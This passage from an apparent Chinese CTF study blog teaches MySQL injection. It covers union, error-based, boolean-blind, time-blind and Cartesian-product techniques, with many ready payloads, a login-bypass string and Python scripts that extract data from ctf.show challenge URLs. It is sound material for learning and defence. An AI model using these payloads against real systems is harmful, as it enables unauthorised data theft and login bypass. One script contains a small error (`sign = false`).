的一个扩展。它返回子程序的特征，如数据库、名字、类型、创建者及创建和修改日期。如果没有指定样式，根据使用的语句，所有的存储程序或存储函数的信息都会被列出。PROCEDURE  和  FUNCTION  分别表示查看存储过程和函数；LIKE  语句表示匹配存储过程或函数的名称。\n\n![image-20250520135904729](../image/achieve/202411/sql深入浅出/image-20250520135904729.png)\n\n例如我们需要查看存储过程\n\n```\nSHOW PROCEDURE STATUS\n```\n\n 在 MySQL 中，存储过程和函数的信息存储在 information_schema 数据库下的 Routines 表中，可以通过查询该表的记录来查询存储过程和函数的信息\n\n```\nSELECT   *   FROM   information_schema.Routines\n```\n\n\n\n## MYSQL注入前提\n\n可以实行注入的地方，通常是一个可以与数据库进行连接的地方。\n\n### INFORMATION_SCHEMA库\n\n我们可以了解到，在mysql>5.0以上版本里都存在一个自带的信息数据库INFORMATION_SCHEMA，这个数据库存储着MYSQL服务器里的其他数据库的全部信息如数据库名，数据库的表，表中的列和数据，所以我们可以通过这个数据库去获取其他数据库的信息，这也是我们后面要讲的绝大多数注入姿势里面都会用到的\n\n- SCHEMATA：里面存储着mysql所有数据库的基本信息\n- TABLES：里面存储着mysql中的表信息，包括表的创建时间更新时间等等\n- COLUMNS：里面存储着mysql中表的列信息，包括这个表的所有列以及每个列的信息，包括列的数据类型，编码类型等\n\n但是这个只有在5.0以上的数据库中才能用到这个信息数据库，而如果低于5.0的话就不能用了，这个我学了再写上去\n\n我们正常的sql查询语句是\n\n字符型\n\n```\nselect * from <表名> where id =’$_GET[id]‘;\n```\n\n数字型\n\n```\nselect * from <表名> where id =$_GET[id];\n```\n\n### 1.判断是否存在SQL注入\n\n单引号判断法，即在参数后面加上单引号（无论字符型还是整型都会因为单引号个数不匹配而报错）\n\n常见的闭合方式\n\n```\n常见的闭合方式：''、\"\"、('')、(\"\")等\n```\n\n**闭合的作用**：为了**使前一段语句正常执行**且**去掉后面语句的限制**，对于后面的语句我们可以用注释符号注释掉\n\n常见的注释符号就是:`-- -`,`#`,`%23`\n\n### **2.判断注入方式**\n\n- • 数字型：当输入的**参数为整形**时，称为数字型注入\n- • 字符型：当输入的**参数为字符串**时，称为字符型注入\n\n*为什么要判断数字型还是字符型\n答：构造恶意*`sql`语句时，数字型无需判断闭合方式，字符型需要判断闭合方式\n\n**数字型判断：**\n\n用最经典的and 1=1和and 1=2进行判断，数字型一般提交内容为数字，**但数字不一定是数字型**\n\n假设某个注入的注入类型是数字型，那么\n\n```\n?select * from information where id=1 and 1=1页面运行正常\n\n?id=1 and 1=2页面运行错误\n```\n\n为什么呢?\n\n在a and b运算中，当使用 `AND` 运算符时，只有当所有条件都为真时，整个条件才被视为真。\n\n解释：当输入 and 1=1时，后台执行 Sql 语句：select * from <表名> where id = x and 1=1，语法正确且逻辑判断为正确，所以返回正常。\n\n当输入 and 1=2时，后台执行 Sql 语句：select * from <表名> where id = x and 1=2，语法正确但逻辑判断为假，所以返回错误。\n\n假设这里是字符型判断的话，我们输入的语句就会有以下的执行情况：\n\n当输入1 and 1=1，1 and 1=2时，后台执行 Sql 语句：\n\n```\nselect * from <表名> where id = ‘x and 1=1’\n\nselect * from <表名> where id = ‘x and 1=2’\n```\n\n查询语句将 and 语句全部转换为了字符串，并没有进行 and 的逻辑判断，所以不会出现以上结果，故假设是不成立的。\n\n**字符型判断：**\n\n也是用最经典的 and ‘1’='1 和 and ‘1’='2来判断\n\n假设某个注入的注入类型是字符型\n\n```\n?id=1’ and ‘1’ = '1'--+,页面运行正常\n\n?id=1’ and ‘1’ = '2,页面运行错误\n```\n\n解释：当输入 and ‘1’='1时，后台执行 Sql 语句：select * from <表名> where id = ‘x’ and ‘1’='1’语法正确，逻辑判断正确，所以返回正确。\n\n当输入 and ‘1’='2时，后台执行 Sql 语句：select * from <表名> where id = ‘x’ and ‘1’='2’语法正确，但逻辑判断错误，所以返回异常。\n\n还有一个方法就是运用运算去进行判断\n\n数字型是可以计算的，但字符型无法进行计算\n\n例如\n\n```\n使用减法计算id值\n\n数字型会得到id=1的数据\nselect * from users where id = 2-1; \n字符型会得到id=2的数据\nselect * from users where id = '2-1';\n```\n\n## sql注入分类\n\n- 有回显\n\n1. 回显有正常信息:union联合注入\n2. 回显有报错信息:报错注入\n\n- 无回显\n\n1. 页面无回显时，利用返回页面判断来判断查询语句正确与否:布尔盲注\n2. 页面无回显时，利用时间延迟语句是否已经执行来判断查询语句正确与否:时间盲注\n\n- 允许同时执行多条语句时，利用逗号同时执行多条语句的注入:堆叠注入\n\n## 1.UNION联合注入\n\n### 什么是联合注入？\n\n联合注入即union注入，其原理就是，在我们原先查询语句的基础上通过union去拼接上我们的select语句，然后我们拼接的查询结果会和前面的select语句的查询结果进行拼接并返回到页面(关于UNION的操作可以返回去看搭建数据库时的讲解)\n\n联合注入的利用条件，UNION 拼接的 SELECT 语句必须拥有相同数量的列，列也必须拥有相似的数据类型，每条 SELECT 语句中的列的顺序必须相同，也就是说只能：\n\n```sql\nselect 1,2,3 from table_name1 union select 4,5,6 from table_name2;\n```\n\n这也是为什么我们在联合注入之前往往需要先利用 `order/group by n` 判断字段的数量。\n\n注入步骤(假设有3列)\n\n- 判断字段数\n\n```\n1' order by 4--+\n```\n\n因为前面说过，order by是对字段进行排序，所以如果我们的4大于我们的字段数，就会出现报错，所以字段数是3\n\n- 判断回显位\n\n```\n-1' union select 1,2,3--+\n```\n\n- 查询数据库名\n\n```\n-1' union select 1,2,(select group_concat(schema.name)from information_schema.schemata)--+\n```\n\nGROUP_CONCAT()用于将分组内的值连接成一个以逗号（或其他分隔符）分隔的字符串,所以这也是为什么我们返回的多个数据库名，表名，列名都是以逗号去分开的原因\n\n`union`后的数字1和2只用于凑列数，无任何实际意义（可以换为其他内容）\n\n- 查询表名\n\n```\n-1' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema = database())--+\n```\n\n- 查询表中列名\n\n```\n-1' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name = '表名')--+\n```\n\n- 查询列中数据\n\n```\n-1' union select 1,2,列名 from 数据库名.表名--+\n```\n\n**MySQL >= 5.0的情况下就是我们常规的union联合注入了，MySQL < 5.0没有information_schema**，联合注入打不通\n\n所以简单来说步骤就是:\n\n```\n判断字段数->判断回显位置->爆数据库->爆表名->爆字段名(列名)->爆数据\n```\n\n到这的话我们顺便提一下这个联合注入的一个小技巧，也就是插入临时表\n\n### 插入临时表\n\n什么意思呢?在使用联合注入时，如果我们查询的数据不存在，那么就会生成一个内容为null的虚拟临时数据，比如我们的payload是\n\n```\nunion select 'wantheflag','123123'\n```\n\n![image-20250121134049242](../image/achieve/202411/sql深入浅出/image-20250121134049242.png)\n\n可以看到这里生成了一个临时的username和password，所以我们在联合注入下可以利用这一技巧去设置一个username和password然后可以利用这个临时数据去进行登录，例如\n\n```\n查询语句\nselect username,password from users where username='$_GET[username]' and password='$_GET[pass]'\npayload\nusername=users' union select 'admin','123123'--+&password=123123\n```\n\n#### 特:万能密码\n\n就是用永真语句进行登录，最常用的就是\n\n```\n' or '1'='1'--+\n```\n\n1=1恒为真。由于OR运算符的两侧只要有一侧为真，整个表达式就为真，因此整个查询条件就恒为真。\n\n## 2.报错注入\n\n通过**特殊函数**的错误使用使其参数被页面输出，但是前提是服务器开启报错信息返回，也就是发生错误时会返回报错信息\n\n报错注入（Error-based）的利用条件是：\n\n1. SQL 操作/函数 报错\n2. 构造会出现执行错误的 SQL 查询语句，将需要获取的信息（如版本、数据库名）放到会在错误信息输出的位置\n3. 网站回显数据库执行的报错信息，得到数据库信息\n\n常见的利用函数有updatexml()、extractvalue()、floor()+rand()等，参考[SQL注入总结](https://xz.aliyun.com/t/2869#toc-25)\n\n```mysql\n1.floor()和rand()\nunion select count(*),2,concat(':',(select database()),':',floor(rand()*2))as a from information_schema.tables group by a       /*利用错误信息得到当前数据库名*/\n2.extractvalue()\nid=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)))\n3.updatexml()\nid=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1))\n4.geometrycollection()\nid=1 and geometrycollection((select * from(select * from(select user())a)b))\n5.multipoint()\nid=1 and multipoint((select * from(select * from(select user())a)b))\n6.polygon()\nid=1 and polygon((select * from(select * from(select user())a)b))\n7.multipolygon()\nid=1 and multipolygon((select * from(select * from(select user())a)b))\n8.linestring()\nid=1 and linestring((select * from(select * from(select user())a)b)\n9.multilinestring()\nid=1 and multilinestring((select * from(select * from(select user())a)b))\n10.exp()\nid=1 and exp(~(select * from(select user())a))\n```\n\n#### XPATH 报错\n\nupdatexml和extractvalue两种\n\n利用条件：Mysql >= 5.1\n\n##### updatexml()报错注入\n\n**Updatexml()函数:**\n\n- 主要用于更新XML类型的数据。\n- 适用于需要修改XML数据中的节点值或插入新节点的场景。\n- 在数据库维护和数据更新方面有着广泛的应用。\n\n语法\n\n```\nupdatexml('XML_document','Xpath_string','New_value')\n```\n\nXML_document：String格式，为XML文档对象的名称\n\nXPath_string ：Xpath格式的字符串 \n\nnew_value：String格式，替换查找到的符合条件的数据\n\n注入过程\n\n```\n查询数据库：id=1' and (select updatexml(1,concat(0x7e,(database()),0x7e),1))#\n\n查询表名:id=1' and (select updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1))#\n\n查询列/字段名:id=1' and (select updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='表名'),0x7e),1))#\n当然也可以使用limit，利用limit进行分页，作用是展示第几条数据\n查询数据：id=1' and (select updatexml(1,concat(0x7e,(select group_concat(列名) from 数据库名.表名 limit 0,1),0x7e),1))#\n```\n\n**Limit x,1中x为任意值**\n\n我们拿第一个爆数据库的语句解释一下payload\n\n```\n1' and (select updatexml(1,concat(0x7e,(select database()),0x7e),1))#\n```\n\n`concat(0x7e, (select database()), 0x7e)`：\n\n- `concat()` 是一个字符串拼接函数，它会将传入的参数连接成一个完整的字符串。\n- `0x7e` 是十六进制的 `~`，这里的作用是将返回的数据用 `~` 包裹，便于分辨。\n- `(select database())` 是一个子查询，用于获取当前数据库的名称。\n- 整体的作用是生成一个看起来像 `~database_name~` 的字符串。\n\n最后的查询结果\n\n- `updatexml()` 函数的第一个参数 `1` 和第三个参数 `1` 并没有实际意义，因为它们并非合法的 XML 文档或路径。\n- 第二个参数 `concat(0x7e, (select database()), 0x7e)` 会生成一个类似 `~database_name~` 的字符串\n\n但是这个语句会报错，因为 `updatexml()` 的第一个参数不是有效的 XML 文档，所以 MySQL 会抛出一个错误，这个错误信息会包含 `concat` 函数生成的字符串，即当前数据库的名称。\n\n##### extractvalue()报错注入\n\n其实和updatexml函数没什么区别，但是\n\n**Extractvalue()函数：**\n\n- 主要用于从XML数据中查询并返回包含指定XPath字符串的字符串。\n- 适用于从XML数据中提取特定信息的场景。\n- 在数据查询和数据解析方面发挥着重要作用。\n\n语法：\n\n```\nextractvalue(xml_document,Xpath_string);\n```\n\n第一个参数：xml_document是string格式，为xml文档对象的名称\n\n第二个参数：Xpath_string是xpath格式的字符串\n\n作用：从目标xml中返回包含所查询值的字符串\n\npayload\n\n```\nand extractvalue(1,(concat(0x7e,(payload))))\n```\n\n注入过程\n\n```\n爆数据库名:id=1' and (select extractvalue(1,concat(0x7e,(database()))))#\n\n爆表名:id=1'and (select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))#\n\n爆字段名:id=1' and (select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='表名'))))#\n\n爆数据:id=1' and(select extractvalue(1,concat(0x7e,(select group_concat(字段名) from 数据库名.表名)))#\n```\n\nextractvalue()能查询字符串的最大长度为32，就是说如果结果可能会超过32，就需要用substring()等函数截取\n\n#### group by报错\n\n##### floor()报错注入\n\nfloor()函数\n\n- **功能**：向下取整，返回小于或等于指定数值的最大整数。\n- **特点**：无论是正数还是负数，`FLOOR()` 函数都会向“数轴下方”取整。\n- **适用场景**：用于数据处理，比如去掉小数部分，或对计算结果进行取整处理。\n\nrand() 是一个用于生成 **随机数** 的函数\n\n- **功能**：生成一个 **0 到 1 之间的随机浮点数**（范围：[0, 1)），结果包含 0，但不包含 1。\n\nfloor(rand(0)*2) 产生的随机数的**前六位** 一定是 “011011”\n\n然后我们看看报错注入的payload\n\n```mysql\n1、select count(*) from information_schema.tables group by concat(database(),floor(rand(0)*2));\n2、select count(*) from information_schema.tables group by concat(database(),floor(rand()*2));\n```\n\n![image-20250507171245178](../image/achieve/202411/sql注入--ctfshow/image-20250507171245178.png)\n\n可以看到这里的库名是被爆出来了，但是为什么第二种payload有时候会爆不出来呢\n\n首先我们要知道这里floor结合group by报错注入的原理和过程\n\n这里的话通过concat函数将数据库名和floor函数的结果相连，这里的结果就是\n\n```\ndatabase()+'0'和database()+'1'两种结果\n```\n\n因为上面我们知道，floor(rand(0)*2) 产生的随机数的**前六位** 一定是 “011011”\n\n所以前六个结果一定是\n\n```\n'database()+'0''\n'database()+'1''\n'database()+'1''\n'database()+'0''\n'database()+'1''\n'database()+'1''\n```\n\n报错注入的原理：\n\n我看到一个师傅的解释挺好的\n\nhttps://www.cnblogs.com/02SWD/p/CTF-sql-group_by.html\n\n![image-20250507172447811](../image/achieve/202411/sql注入--ctfshow/image-20250507172447811.png)\n\n其实就是通过虚拟表的创建和插入去造成报错返回数据\n\n注入payload\n\n```mysql\n爆库名：\nid=1'union select count(*),2,concat('~',(select database()),'~',floor(rand()*2))as a from information_schema.tables group by a#\n爆表名：\nid=1' union select count(*),2,concat('~',(select group_concat(table_name)from information_schema.tables where table_schema=database()),'~',floor(rand()*2))as a from information_schema.tables group by a#\n爆列名：\nid=1' union select count(*),2,concat('~',(select group_concat(column_name)from information_schema.columns where table_name='表名'),'~',floor(rand()*2))as a from information_schema.tables group by a#\n爆字段：\nid=1' union select count(*),2,concat('~',(select group_concat(列名)from 数据库名.表名),'~',floor(rand()*2))as a from information_schema.tables group by a#\n```\n\n使用floor报错注入，需要确保查询的表必须大于三条数据\n\n除了floor函数，其他的几个函数也能用\n\n```\nceil()-向上取整函数\nceil(x) 返回不小于 x 的最小整数，即向上取整。\n例如，ceil(3.14) 返回 4。\n\nround() - 四舍五入函数\nround(x) 返回最接近 x 的整数，如果有两个整数与 x 距离相等，则返回偶数的整数。\n例如，round(3.6) 返回 4，round(3.5) 返回 4，round(3.4) 返回 3。\n```\n\npayload\n\n```\n爆库名：\nid=1'union select count(*),2,concat('~',(select database()),'~',ceil(rand()*2))as a from information_schema.tables group by a#\n爆库名：\nid=1'union select count(*),2,concat('~',(select database()),'~',round(rand()*2))as a from information_schema.tables group by a#\n```\n\n\n\n#### 数溢出报错\n\n##### exp()报错注入\n\n`EXP()` 是一个数学函数，它用来计算 **自然指数函数（e^x）** 的值\n\n- EXP(x) = e^x\n\n![image-20250121163822411](../image/achieve/202411/sql深入浅出/image-20250121163822411.png)\n\n那这个注入的原理是什么呢？\n\nSQL语句中，函数成功执行后返回0，将0按位取反后会得到**18446744073709551615**（最大的无符号值），如果对这个值进行数值表达式运算则会导致溢出错误。\n\npayload\n\n```\nselect exp(~(payload))\n```\n\n注入过程\n\n```\n爆数据库\nselect exp(~(select * from (database())x))#\n爆表名：\nselect exp(~(select * from(select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1)x))#\n爆列名：\nselect exp(~(select * from(select group_concat(column_name) from information_schema.columns where table_name='users' limit 0,1)x))#\n爆字段：\nselect exp(~(select * from(select 列名 from 数据库名.表名)))#\n```\n\n但是数溢出报错只有在mysql>5.5以上的版本才会产生溢出错误信息，以下的版本对于溢出不会发送任何信息\n\n## 3.布尔盲注\n\n进行布尔盲注的条件是页面会有回显作为语句执行是否成功的标志，一般我们可以先用永真条件`or 1=1`与永假条件`and 1=2`的返回内容是否存在差异进行判断是否可以进行布尔盲注\n\n什么情况下考虑使用布尔盲注？\n\n- 该输入框存在注入点。\n- 该页面或请求不会回显注入语句执行结果，故无法使用UNION注入。\n\n- 对数据库报错进行了处理，无论用户怎么输入都不会显示报错信息，故无法使用报错注入。\n\n基本函数\n\n- ascii()函数:`ASCII()` 函数用于返回字符串中第一个字符的 ASCII 值。如果字符串为空，返回值为 0。\n\n#### ASCII替换函数\n\nord()函数：ORD() 函数返回字符串第一个字符的ASCII 值，如果该字符是一个多字节（即一个或多个字节的序列），则MySQL函数将返回最左边字符的代码。\n\n当然如果两个ascii函数被禁用了的话也可以直接不用这些转ASCII函数，而是直接进行字符集匹配\n\n- substr()函数:SUBSTR()函数（在某些数据库中也称为 SUBSTRING()）用于从一个字符串中提取子字符串。\n\n#### substr替换函数\n\n##### left()函数\n\n在 MySQL 中，`LEFT()` 函数用于从字符串的左侧提取指定数量的字符\n\n语法\n\n```\nLEFT(string, length)\n```\n\n- **`string`**：要提取字符的字符串。\n- **`length`**：要提取的字符数量。\n\n##### right()函数\n\n在 MySQL 中，`RIGHT()` 函数用于从字符串的右侧提取指定数量的字符。\n\n```\nRIGHT(string, length)\n```\n\n- **`string`**：要提取字符的字符串。\n- **`length`**：要提取的字符数量。\n\n##### mid()函数\n\n在 MySQL 中，`MID()` 函数用于从字符串的指定位置开始提取指定数量的字符。\n\n语法\n\n```\nMID(string, start, length)\n```\n\n- **`string`**：要提取字符的字符串。\n- **`start`**：开始提取的位置（从 1 开始计数）。\n- **`length`**：要提取的字符数量（可选，如果省略，则提取从 `start` 到字符串末尾的所有字符）。\n\n##### substring()函数\n\n在 MySQL 中，`SUBSTRING()` 函数用于从字符串的指定位置开始提取指定数量的字符。\n\n```\nSUBSTRING(string, start, length)\n```\n\n- **`string`**：要提取字符的字符串。\n- **`start`**：开始提取的位置（从 1 开始计数）。\n- **`length`**：要提取的字符数量（可选，如果省略，则提取从 `start` 到字符串末尾的所有字符）。\n\n​\tlpad（str，len，padstr）\n\n​\trpad（str，len，padstr）在str的左（右）两边填充给定的padstr到指定的长度len，返回填充的结果\n\n**手工注入：**\n\n**1. 判断是否存在注入以及注入类型**\n\n**2. 构造sql语句，利用length()函数得到数据库长度：**1 and(length(database()))>x根据回显是否正常来判断数据库长度\n\n**3. 猜测数据库名字，利用ascii()函数和substr()函数依次得到数据库的名字，例如：**1 and (ascii(substr(database(),y,1)))>x，根据每个字母的ascii值找出数据库的第y个字母\n\n**4. 判断表的数量,例如:**1 and (select count(table_name) from information_schema.tables where table_schema=database())>x来判断表的数量\n\n**5. 猜测表名:**1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit x,1),y,1))>x 来猜测第x张表的第y个字母\n\n**6. 猜测字段数量:**1 and (select count(column_name) from information_schema.columns where table_name='表名')=1\n\n**7. 猜测数据内容:**1 and ascii(substr((select * from 数据库.表名 where id=1),1,1))>x\n\n手工盲注比较繁琐，一般都会用脚本去注入或者用工具sqlmap\n\n布尔盲注的脚本我贴一个最基础的\n\n```python\nimport requests\n#GET请求的布尔盲注\n    #爆破数据库的长度\ndef brute_force_database_length(url, headers):\n    databaselen = 0\n    for l in range(1,50):\n        databaselen_payload = f\"?id=1' and length(database())={l}--+\"\n        response = requests.get(url + databaselen_payload, headers=headers)  \n        if 'admin'in response.text:#判断是否存在注入\n            databaselen = l\n            break\n    print('数据库名字长度为:  '+ str(databaselen))\n    return databaselen\n\n    #爆破数据库的名字\ndef brute_force_database_name(url, headers, databaselen):\n    databasename = ''   \n    sign = false\n    for l in range(1,100):#用来爆破数据库的字符\n        for i in range(32,128):\n            databasechar_payload = f\"?id=1' and ascii(substr(database(),{l},1))='{i}'--+\"\n            response = requests.get(url + databasechar_payload, headers=headers) \n            if 'admin'in response.text:#判断是否存在注入\n                databasename += chr(i)\n                print(databasename)\n                break\n    print('数据库名字为:  '+ str(databasename))\n    return databasename\n #爆破表的个数\ndef brute_force_table_count(url, headers, databasename):\n    tablecount = 0\n    for l in range(1,50):#用来爆破表的个数\n        tablecount_payload = f\"?id=1' and (select count(table_name) from information_schema.tables where table_schema='{databasename}') ={l}--+\"\n        response = requests.get(url + tablecount_payload, headers=headers) \n        if 'admin'in response.text:#判断是否存在注入\n            tablecount = l\n            break\n    print(f'表的个数为: {tablecount}')\n    return tablecount\n#爆破表的名字\ndef brute_force_table_name(url, headers, tablecount,databasename):\n    tables=[]\n    for t in range(0,tablecount):\n        table_name = ''\n        tablelen = 0\n        for l in range(1, 50):\n            tablelen_payload = f\"?id=1' and length((select table_name from information_schema.tables where table_schema = '{databasename}' limit {t+0}, 1))={l}--+\"\n            response = requests.get(url + tablelen_payload, headers=headers)\n            if 'admin'in response.text:\n                tablelen = l\n                break\n        print(f'表{t+1}的长度为: {tablelen}')\n        for m in range(1, tablelen+1):\n            for i in range(32, 128):\n                table_name_payload = f\"?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema = '{databasename}' limit {t+0}, 1),{m},1))='{i}'--+\"\n                response = requests.get(url + table_name_payload, headers=headers)\n                if 'admin'in response.text:\n                    table_name += chr(i)\n                    print(table_name)\n                    break\n        print(f'表{t+1}的名字为: {table_name}')\n        tables.append(table_name)\n    return tables\n'''\n#爆破字段的个数\ndef brute_force_column_count(url, headers, tables):\n    column_count = 0\n    for l in range(1, 50):\n        column_countpayload = f\"?id=1' and (select count(column_name) from information_schema.columns where table_name='{tables}')={l}--+\"\n        response = requests.get(url + column_countpayload, headers=headers)\n        if 'admin'in response.text:\n            column_count = l\n            break\n    print(f'表 {tables} 有 {column_count} 字段.') \n    return column_count\n\n#查询表中字段\ndef brute_force_column_name(url, headers,tables, column_count):\n    columns = []\n    for c in range(column_count):\n        column_name = ''\n        for l in range(1, 50):\n            column_count_payload = f\"?id=1' and length((SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name='{tables}' LIMIT {c},1))={l}--+\"\n            response = requests.get(url + column_count_payload, headers=headers)\n            if 'admin'in response.text:\n                column_count = l\n                print(f'表 {tables} 中字段 {c+1} 的个数为: {column_count}')\n        for m in range(1, column_count+1):\n            for i in range(32, 128):\n                column_name_payload = f\"?id=1' and ascii(SUBSTR((SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name='{tables}' LIMIT {c},1),{m},1))='{i}'--+\"\n                response = requests.get(url + column_name_payload, headers=headers)\n                if 'admin'in response.text:\n                    column_name += chr(i)\n                    print(column_name)\n                    break\n        print(f'表 {tables}  中字段 {c+1} 的名字为: {column_name}')\n        columns.append(column_name)\n    return columns\n'''\n#查询表中数据\ndef brute_force_table_data(url, headers,tables):\n    data = ''\n    for c in range(0,100):#用来爆破表中的数据\n        for i in range(32,128):\n            data_payload = f\"?id=1' and ascii(substr((select password from {tables} where username='flag'),{c+0},1))='{i}'--+\"\n            response = requests.get(url + data_payload, headers=headers) \n            if 'admin'in response.text:#判断是否存在注入\n                data += chr(i)\n                print(data)\n                break\n    print('flag为:  '+ str(data))\n    return data\nif __name__ == \"__main__\":\n    url = 'http://598dad09-8ca9-4769-9d38-8f62ee4186c7.challenge.ctf.show/api/v4.php'\n    headers = {\n        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'\n    }\n    databaselen = brute_force_database_length(url, headers)\n    databasename = brute_force_database_name(url, headers, databaselen)\n    tablecount = brute_force_table_count(url, headers, databasename)\n    tables = brute_force_table_name(url, headers, tablecount, databasename)\n    for table in tables:\n        #column_count = brute_force_column_count(url, headers, table)   \n        #columns = brute_force_column_name(url, headers,table, column_count)\n        data = brute_force_table_data(url, headers,table)\n```\n\n#### 姿势一:case ... when ... then ... else ... end\n\n随便给个payload\n\n```\ncase(ascii(substr(database()from(1)for(1))))when(102)then(1)else(0)end\n```\n\n- 这是一个条件表达式。它根据某个条件的值返回不同的结果。\n- 具体来说，`case ascii(substr(database() from 1 for 1))` 这部分将检查数据库名称第一个字符的 ASCII 值。\n- 如果这个值是 `102`（对应字符 'f'），则返回 `1`；否则返回 `0`。\n\n## 4.时间盲注\n\n界面返回值只有一种,true 无论输入任何值 返回情况都会按正常的来处理。加入特定的时间函数，通过查看web页面返回的时间差来判断注入的语句是否正确。\n\n小tips:**在真实的渗透测试过程中，我们有时候不清楚整个表的情况的话，可以用这样的方式进行刺探，比如设置成 sleep(1) 看最后多少秒有结果，推断表的行数就是多少**)\n\n![image-20250119205506435](../image/achieve/202411/sql深入浅出/image-20250119205506435.png)\n\n这里可以看到延时了8s也就是4个2s，可以看到我们的行数也是4，但是不知道为啥没出结果是我没想到的\n\n时间盲注与布尔盲注类似。时间型盲注就是利用时间函数的延迟特性来判断注入语句是否执行成功。\n\n什么情况下考虑使用时间盲注？\n\n\t1. 无法确定参数的传入类型。整型，加单引号，加双引号返回结果都一样\n\t1. 不会回显注入语句执行结果，故无法使用UNION注入\n\t1. 不会显示报错信息，故无法使用报错注入\n\t1. 符合盲注的特征，但不属于布尔型盲注\n\n常用函数\n\nsleep(n)：将程序挂起一段时间, n为n秒。\n\nif(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句。\n\n使用sleep()函数和if()函数：`and (if(ascii(substr(database(),1,1))>100,sleep(10),null)) #`   如果返回正确则 页面会停顿10秒，返回错误则会立马返回。只有指定条件的记录存在时才会停止指定的秒数。\n\n**手工注入:**\n\n**1. 利用sleep()函数和if()函数判断数据库长度：**1 and if(length(database())=x,sleep(y),1)--页面y秒后才回应，说明数据库名称长度为x\n\n**2. 猜测数据库名称:例如:**1 and if(ascii(substr(database(),1,1))=115,sleep(3),1) adcii(s)=115\n\n**3. 猜测表中数:**1 and if((select count(table_name) from information_schema.tables where table_schema=database())=x,sleep(y),1) 页面y秒后反应，说明有x张表\n\n**4. 猜测表:**1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=110,sleep(3),1)  ascii(n)=110\n\n**5. 猜测字段数:**1 and if((select count(column_name) from information_schema.columns where table_name='flag')=1,sleep(3),1)  3秒后响应，只有一个字段\n\n**6. 猜测字段名:**1 and if(ascii(substr((select column_name from information_schema.columns where table_name='表名'),1,1))=102,sleep(3),1) \n\n### 常规盲注\n\n##### sleep函数\n\nsleep()函数:`sleep()` 函数用于使程序暂停或延迟一段时间\n\n##### benchmark函数\n\nbenchmark()函数:`BENCHMARK(loop_count,expr)`函数用来测试 SQL 语句或者函数的执行时间，第一个参数表示执行的次数，第二个参数表示要执行的操作。通常使用使用 MD5、SHA1 等函数，执行次数 100000。\n\n如benchmark(10000000,md5(‘yu22x’));会计算10000000次md5(‘yu22x’)，因为次数很多所以就会产生延时，但这种方法对服务器会对产生很大的负荷，容易把服务器跑崩，如果崩掉的话就把time.sleep的值改大点，除了md5还可以使用其他函数，比如：\n\n```plain\nbenchmark(1000000,encode(\"hello\",\"good\"));\nbenchmark(1e7,sha1('kradress'));\n```\n\n**手工盲注特别繁琐，碰到这类题目要会用脚本或工具sqlmap**\n\n贴个时间盲注的脚本\n\n```python\nimport requests\nimport datetime\nimport time\ndef brute_force_table_data(url):\n    data = ''\n    for c in range(0,100):#用来爆破表中的数据\n        for i in range(32,128):\n            payload = f\"?id=1' and if(ascii(substr((select password from ctfshow_user5 where username='flag'),{c+0},1))='{i}',sleep(5),0)--+\"\n            time1 = datetime.datetime.now()\n            r = requests.get(url + payload)\n            time2 = datetime.datetime.now()\n            sec = (time2 - time1).seconds\n            if sec >= 5:#超时时间为5秒\n                data += chr(i)\n                print(data)\n                break\n    print('flag为:  '+ str(data))\n    return data\nif __name__ == \"__main__\":\n    url = 'http://4a879471-5db2-4202-876f-d5c67c22bc4f.challenge.ctf.show/api/v5.php'\n    flag = brute_force_table_data(url)\n```\n\n那如果这两个函数都被禁用了的话呢?我们又该如何去进行时间盲注\n\n### 笛卡尔积盲注\n\n##### 什么是笛卡尔积\n\n**笛卡尔积**（Cartesian Product）是集合论和关系代数中的一个基本概念，它指的是**两个集合（或表）中所有可能的有序对的组合**。\n\n假设有两个集合 *A* 和 B：\n\n```\nA={a1,a2,…,am}\nB={b1,b2,…,bn}\n```\n\n那么，*A* 和 *B* 的笛卡尔积 A×B定义为：\n\n```\nA×B={(ai,bj)∣ai∈A,bj∈B}\n```\n\n即 A*×*B 包含所有 A 中的元素与 B 中的元素的组合。\n\n在数据库中看，笛卡尔积指的是**两个表中的所有行的组合**。假设有两个表 A 和 B：\n\n- 表 A 有 m行，表 B 有 n 行。\n- 表 A有 p列，表 B有 q列。\n\n那么，表 A和表 B的笛卡尔积结果是一个新表，包含：\n\n- **行数**：m×n行。\n- **列数**：p+q列（表 A的所有列 + 表 B的所有列）。\n\n其实说白了就是两个表中每一行跟另一个表所有行的不同组合的结果\n\n例如\n\n- 表A 有 2 行，列名为id和 name\n\n  ```\n  id | name\n  ---|------\n  1  | Alice\n  2  | Bob\n  ```\n\n- 表B 有 3 行，列名为 city和country\n\n  ```\n  city    | country\n  --------|---------\n  Beijing | China\n  New York| USA\n  Tokyo   | Japan\n  ```\n\n那么此时他们的笛卡尔积结果是什么呢？\n\n```\nid | name  | city     | country\n---|-------|----------|--------\n1  | Alice | Beijing  | China\n1  | Alice | New York | USA\n1  | Alice | Tokyo    | Japan\n2  | Bob   | Beijing  | China\n2  | Bob   | New York | USA\n2  | Bob   | Tokyo    | Japan\n```\n\n笛卡尔积为什么能打盲注呢？\n\n因为笛卡尔积的算法是一种乘法，在查询数据很多的表的时候结果会呈现指数倍的增长，导致运算量很大，从而在查询的时候造成延时。**实现的方法就是将表查询不断的叠加，使之以指数倍运算量的速度增长，不断增加系统执行 sql 语句的负荷，直到可以达到我们想要的时间延迟**，但是由于我们真实的ctf题目或者真实环境中的表和字段等信息是不一样的，所以我们通常都会利用mysql系统自带的表去进行笛卡尔积盲注\n\npayload\n\n```mysql\nSELECT count(*) FROM information_schema.columns 